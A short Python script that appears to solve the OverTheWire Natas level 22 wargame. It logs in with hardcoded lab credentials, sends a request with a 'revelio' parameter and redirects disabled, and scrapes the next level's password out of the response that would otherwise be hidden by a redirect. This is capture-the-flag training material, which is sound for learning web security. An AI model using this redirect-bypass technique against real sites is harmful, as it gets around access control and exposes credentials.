# Redirection Disabled

import re
import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas22'
password = '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)

# Get request with redirection disabled
resp = session.get(url, params={"revelio": "whatever"}, allow_redirects=False)

print(f"Username: {re.search('Username: (.*)', resp.text).group(1)}")
print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
